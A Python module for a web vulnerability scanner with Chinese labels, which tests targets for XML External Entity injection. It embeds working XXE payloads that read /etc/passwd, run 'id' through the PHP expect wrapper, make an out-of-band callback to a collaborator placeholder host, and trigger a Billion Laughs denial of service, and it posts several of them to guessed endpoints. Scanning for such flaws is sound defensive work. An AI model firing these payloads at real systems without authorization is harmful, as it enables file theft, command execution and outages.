"""
XXE (XML External Entity) Vulnerability Scanner
Detects XXE injection vulnerabilities in XML parsers
"""
import re
import urllib.parse
from app.scanner.base import BaseScanner
from app.scanner.loader import register_scanner
from app.core.http_client import get_client


@register_scanner
class XXEDetector(BaseScanner):
    name = "XXE外部实体注入漏洞"
    description = "检测目标是否存在XXE漏洞，攻击者可读取服务器文件、发起SSRF攻击或导致拒绝服务"
    category = "xxe"
    module = "xxe_detector"
    risk_level = "high"
    risk_score = 80
    cve_ids = []
    references = [
        "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
        "https://portswigger.net/web-security/xxe",
    ]
    fix_suggestion = "禁用XML外部实体解析，使用安全的XML解析器配置，实施DTD验证白名单。"

    XXE_PAYLOADS = [
        {
            "name": "Basic XXE - File Read",
            "content_type": "application/xml",
            "body": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
            "indicators": ["root:", "daemon:", "bin:"],
        },
        {
            "name": "XXE - PHP Expect Wrapper",
            "content_type": "application/xml",
            "body": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>""",
            "indicators": ["uid=", "gid="],
        },
        {
            "name": "XXE - Parameter Entities",
            "content_type": "application/xml",
            "body": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>""",
            "indicators": ["root:"],
        },
        {
            "name": "XXE - Blind Out-of-Band",
            "content_type": "application/xml",
            "body": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR_URL/xxe_test">
  %xxe;
]>
<root>test</root>""",
            "indicators": [],
        },
        {
            "name": "XXE - SOAP Request",
            "content_type": "text/xml",
            "body": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>&xxe;</test>
  </soap:Body>
</soap:Envelope>""",
            "indicators": [],
        },
        {
            "name": "XXE - SVG Upload",
            "content_type": "image/svg+xml",
            "body": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="15">&xxe;</text>
</svg>""",
            "indicators": ["root:"],
        },
        {
            "name": "XXE - Billion Laughs DoS",
            "content_type": "application/xml",
            "body": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>""",
            "indicators": [],
        },
    ]

    def __init__(self, target: str):
        super().__init__(target)
        self._client = get_client()

    def _find_xml_endpoints(self, html: str) -> list:
        endpoints = []
        soap_patterns = [
            r'(?:url|endpoint|location)\s*[:=]\s*["\']([^"\']*(?:wsdl|soap|xml|asmx|svc)[^"\']*)["\']',
            r'action\s*=\s*["\']([^"\']*\.xml[^"\']*)["\']',
        ]
        for pattern in soap_patterns:
            for match in re.finditer(pattern, html, re.IGNORECASE):
                endpoints.append(match.group(1))
        return endpoints

    def check(self) -> bool:
        found_any = False

        test_endpoints = [self.target]
        try:
            resp = self._client.get(self.target, timeout=10)
            if resp.status and resp.body:
                html = resp.body.decode("utf-8", errors="replace")
                test_endpoints.extend(self._find_xml_endpoints(html))
        except Exception:
            pass

        xml_paths = ["/api/xml", "/api/soap", "/webservice", "/service", "/xml",
                     "/api/v1/xml", "/rest/api", "/soap", "/ws", "/WebService"]
        for path in xml_paths:
            test_endpoints.append(urllib.parse.urljoin(self.target, path))

        for endpoint in test_endpoints[:5]:
            for xxe_payload in self.XXE_PAYLOADS[:4]:
                try:
                    resp = self._client.post(
                        endpoint,
                        data=xxe_payload["body"],
                        headers={"Content-Type": xxe_payload["content_type"]},
                        timeout=10,
                    )
                    if resp.status and resp.body:
                        text = resp.body.decode("utf-8", errors="replace")
                        for indicator in xxe_payload["indicators"]:
                            if indicator in text:
                                found_any = True
                                self.add_result(
                                    name=f"XXE外部实体注入漏洞 - {xxe_payload['name']}",
                                    target_url=endpoint,
                                    description="检测到XXE漏洞，攻击者可读取服务器文件、发起SSRF攻击或导致拒绝服务。",
                                    detail=f"Payload类型: {xxe_payload['name']}\n检测到文件内容泄露。",
                                    payload=xxe_payload["body"][:500],
                                    evidence=text[:500],
                                )
                                return True
                except Exception:
                    continue

        return found_any
